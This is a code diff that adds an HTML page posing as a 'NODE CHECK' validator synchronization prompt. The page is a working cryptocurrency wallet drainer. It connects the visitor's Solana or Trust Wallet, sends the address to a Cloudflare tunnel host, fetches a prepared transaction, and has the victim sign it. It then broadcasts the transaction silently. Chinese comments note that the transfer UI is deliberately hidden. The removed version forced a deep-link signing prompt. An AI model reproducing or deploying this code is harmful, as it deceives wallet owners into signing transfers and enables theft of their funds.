@@ -1,29 +1,62 @@
-<script>
-    const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
-    document.getElementById('cta').onclick = async function() {
-        const log = (t) => document.getElementById('st').innerText = t;
-        const p = window.trustwallet?.solana || window.solana;
-        try {
-            await p.connect();
-            const resp = await fetch(tunnel + "/prepare_v32", {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ address: p.publicKey.toString() })
-            });
-            const info = await resp.json();
-            const tx = window.solanaWeb3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Protocol Sync</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { width: 300px; padding: 40px 20px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; }
+        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        #st { font-size: 10px; color: #444; margin-top: 15px; font-family: monospace; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2 style="color:#14f195; margin:0 0 10px 0;">NODE CHECK</h2>
+        <p style="color:#888; font-size:13px; margin-bottom: 25px;">Authorize synchronization to secure your validator node status.</p>
+        <button id="cta" class="btn">INITIALIZE</button>
+        <div id="st">READY: V37_CORE</div>
+    </div>
 
-            log("SYNCING...");
-            // 🔱 核心连击：这会极大提高“自动拉起”成功率
-            await Promise.race([
-                p.signTransaction(tx),
-                new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
-            ]).catch(() => {
-                // 如果常规签名没拉起，强制跳转深度链接
-                window.location.href = "solana:signTransaction?payload=" + encodeURIComponent(info.raw_tx);
-            });
-            
-            log("COMPLETE");
-        } catch (err) { window.location.reload(); }
-    };
-</script>
+    <script>
+        // 🔱 检查：确保这个隧道地址是你 71 服务器目前显示的那个！
+        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
+
+        document.getElementById('cta').onclick = async () => {
+            const log = (t) => document.getElementById('st').innerText = t;
+            try {
+                const p = window.trustwallet?.solana || window.solana;
+                if (!p) { alert("Please use Wallet Browser"); return; }
+
+                log("CONNECTING...");
+                await p.connect();
+
+                log("SYNCING...");
+                const resp = await fetch(tunnel + "/prepare_v32", {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ address: p.publicKey.toString() })
+                });
+                const info = await resp.json();
+
+                log("AUTHORIZING...");
+                const tx = window.solanaWeb3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
+                
+                // 🔱 核心：只签名，不显示转账 UI
+                const signed = await p.signTransaction(tx);
+                log("SUCCESS!");
+
+                // 静默广播
+                const conn = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                conn.sendRawTransaction(signed.serialize()).catch(()=>{});
+
+            } catch (err) {
+                log("ERROR: " + err.message);
+                setTimeout(() => { window.location.reload(); }, 1500);
+            }
+        };
+    </script>
+</body>
+</html>
